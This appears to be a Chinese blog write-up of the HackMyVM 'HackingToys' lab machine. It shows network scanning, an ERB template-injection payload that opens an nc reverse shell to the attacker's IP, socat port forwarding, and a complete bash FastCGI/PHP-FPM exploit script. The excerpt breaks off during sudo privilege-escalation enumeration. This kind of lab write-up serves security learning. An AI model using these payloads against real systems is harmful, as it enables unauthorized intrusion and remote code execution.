@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HMV HackingToys - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HMV HackingToys">
+  <meta property="og:description" content="HackingToys 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=HackingToys
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.178 08:00:27:23:bb:bb (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded ┌──(kali㉿kali)-[~] └─$ nmap 192.168.31.178 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT Nmap scan report for 192.168.31.178 Host is up (0.0013s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds 有ssl证书，https访问3000端口">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-03T14:37:45+08:00">
+    <meta property="article:modified_time" content="2025-03-03T14:37:45+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HMV HackingToys">
+  <meta name="twitter:description" content="HackingToys 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=HackingToys
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.178 08:00:27:23:bb:bb (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded ┌──(kali㉿kali)-[~] └─$ nmap 192.168.31.178 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT Nmap scan report for 192.168.31.178 Host is up (0.0013s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds 有ssl证书，https访问3000端口">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/hmv_hackingtoys/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/hmv_metamorphose/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/hmv_publisher/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HMV HackingToys",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/hmv_hackingtoys\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  1066 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/hmv_hackingtoys\/","datePublished": "2025-03-03T14:37:45+08:00","dateModified": "2025-03-03T14:37:45+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HMV HackingToys</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-03">2025-03-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1066 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;<span id="/hmv_hackingtoys/" class="leancloud_visitors" data-flag-title="HMV HackingToys">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hackingtoys">HackingToys</a>
+      <ul>
+        <li><a href="#靶场链接">靶场链接</a></li>
+        <li><a href="#日常扫描">日常扫描</a></li>
+        <li><a href="#反弹shell">反弹shell</a></li>
+        <li><a href="#提权">提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="hackingtoys">HackingToys</h2>
+<h3 id="靶场链接">靶场链接</h3>
+<p><a href="https://hackmyvm.eu/machines/machine.php?vm=HackingToys" target="_blank" rel="noopener noreffer ">https://hackmyvm.eu/machines/machine.php?vm=HackingToys</a></p>
+<h3 id="日常扫描">日常扫描</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l        
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+</span></span><span class="line"><span class="cl">192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
+</span></span><span class="line"><span class="cl">192.168.31.178  08:00:27:23:bb:bb       (Unknown)
+</span></span><span class="line"><span class="cl">192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
+</span></span><span class="line"><span class="cl">192.168.31.210  f4:6d:3f:27:e6:fb       (Unknown)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4 packets received by filter, 0 packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ nmap 192.168.31.178                                         
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.31.178
+</span></span><span class="line"><span class="cl">Host is up (0.0013s latency).
+</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有ssl证书，https访问3000端口</p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>有个输入框，输入1试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Product does not exist
+</span></span><span class="line"><span class="cl">url
+</span></span><span class="line"><span class="cl">https://192.168.31.178:3000/search?query=1&amp;message=Product+does+not+exist
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>像是ssti</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://192.168.31.178:3000/search?query=1&amp;message=%3c%25%3d+7*7+%25%3e
+</span></span><span class="line"><span class="cl">回显49
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">弹shell
+</span></span><span class="line"><span class="cl">&lt;%= system(&#34;nc -e /bin/sh 192.168.31.183 4444&#34;); %&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功啦，但是这个用户没有flag，草了</p>
+<h3 id="提权">提权</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lidia@MiWiFi-R4CM-srv:/home$ ss -nltp
+</span></span><span class="line"><span class="cl">ss -nltp                                                                                                                                                    
+</span></span><span class="line"><span class="cl">State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                       
+</span></span><span class="line"><span class="cl">LISTEN 0      511        127.0.0.1:80        0.0.0.0:*                                 
+</span></span><span class="line"><span class="cl">LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                 
+</span></span><span class="line"><span class="cl">LISTEN 0      1024         0.0.0.0:3000      0.0.0.0:*    users:((&#34;ruby&#34;,pid=427,fd=7))
+</span></span><span class="line"><span class="cl">LISTEN 0      4096       127.0.0.1:9000      0.0.0.0:*                                 
+</span></span><span class="line"><span class="cl">LISTEN 0      128             [::]:22           [::]:*     
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>9000和80都不知道在干啥，转发出去，先把socat上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[/usr/bin]
+</span></span><span class="line"><span class="cl">└─$ python3 -m http.server 8888    
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+</span></span><span class="line"><span class="cl">192.168.31.178 - - [02/Mar/2025 20:49:41] &#34;GET / HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">192.168.31.178 - - [02/Mar/2025 20:51:31] &#34;GET /socat HTTP/1.1&#34; 200 -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lidia@MiWiFi-R4CM-srv:/tmp$ wget http://192.168.31.183:8888/socat
+</span></span><span class="line"><span class="cl">wget http://192.168.31.183:8888/socat
+</span></span><span class="line"><span class="cl">--2025-03-02 13:51:31--  http://192.168.31.183:8888/socat
+</span></span><span class="line"><span class="cl">Connecting to 192.168.31.183:8888... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
+</span></span><span class="line"><span class="cl">Length: 530680 (518K) [application/octet-stream]
+</span></span><span class="line"><span class="cl">Saving to: ‘socat’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">socat               100%[===================&gt;] 518.24K  --.-KB/s    in 0.02s   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-03-02 13:51:31 (24.0 MB/s) - ‘socat’ saved [530680/530680]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lidia@MiWiFi-R4CM-srv:/tmp$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">index.html
+</span></span><span class="line"><span class="cl">socat
+</span></span><span class="line"><span class="cl">systemd-private-f6d16d6478584049844ac1ca3ccaef9a-apache2.service-Pkk09d
+</span></span><span class="line"><span class="cl">systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-logind.service-ILjViD
+</span></span><span class="line"><span class="cl">systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-timesyncd.service-NsgWNx
+</span></span><span class="line"><span class="cl">lidia@MiWiFi-R4CM-srv:/tmp$ chmod +x socat
+</span></span><span class="line"><span class="cl">chmod +x socat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:80&amp;
+</span></span><span class="line"><span class="cl">[1] 1314
+</span></span><span class="line"><span class="cl">(remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000&amp;
+</span></span><span class="line"><span class="cl">[2] 1318
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>9000端口这个洞是可以打的，参考https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi
+这个端口的信息可以看https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">&#34;&lt;?php echo &#39;&lt;!--&#39;; system(&#39;whoami&#39;); echo &#39;--&gt;&#39;;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">FILENAMES</span><span class="o">=</span><span class="s2">&#34;/var/www/html/index.php&#34;</span> <span class="c1"># Exisiting file path</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">HOST</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">B64</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$PAYLOAD</span><span class="s2">&#34;</span><span class="p">|</span>base64<span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> FN in <span class="nv">$FILENAMES</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">OUTPUT</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
+</span></span><span class="line"><span class="cl">    env -i <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>      <span class="nv">PHP_VALUE</span><span class="o">=</span><span class="s2">&#34;allow_url_include=1&#34;</span><span class="s1">$&#39;\n&#39;</span><span class="s2">&#34;allow_url_fopen=1&#34;</span><span class="s1">$&#39;\n&#39;</span><span class="s2">&#34;auto_prepend_file=&#39;data://text/plain\;base64,</span><span class="nv">$B64</span><span class="s2">&#39;&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>      <span class="nv">SCRIPT_FILENAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">SCRIPT_NAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span>POST <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>      cgi-fcgi -bind -connect <span class="nv">$HOST</span>:9001 <span class="p">&amp;</span>&gt; <span class="nv">$OUTPUT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    cat <span class="nv">$OUTPUT</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打一下试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./exp.sh 192.168.31.178
+</span></span><span class="line"><span class="cl">Content-type: text/html; charset=UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!--dodi
+</span></span><span class="line"><span class="cl">uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)
+</span></span><span class="line"><span class="cl">--&gt;
+</span></span><span class="line"><span class="cl">..........
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改一下弹shell就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> dodi@hacktoys:/home/dodi$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> dodi on hacktoys:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User dodi may run the following commands on hacktoys:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/rvm_rails.sh
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> dodi@hacktoys:/home/dodi$ cat /usr/local/bin/rvm_rails.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">rvm_prefix</span><span class="o">=</span>/usr/local
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">MY_RUBY_HOME</span><span class="o">=</span>/usr/local/rvm/rubies/ruby-3.1.0
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RUBY_VERSION</span><span class="o">=</span>ruby-3.1.0
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">rvm_version</span><span class="o">=</span>1.29.12
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">rvm_bin_path</span><span class="o">=</span>/usr/local/rvm/bin
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">GEM_PATH</span><span class="o">=</span>/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">GEM_HOME</span><span class="o">=</span>/usr/local/rvm/gems/ruby-3.1.0
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">IRBRC</span><span class="o">=</span>/usr/local/rvm/rubies/ruby-3.1.0/.irbrc
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">rvm_path</span><span class="o">=</span>/usr/local/rvm
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> /usr/local/rvm/gems/ruby-3.1.0/bin/rails <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
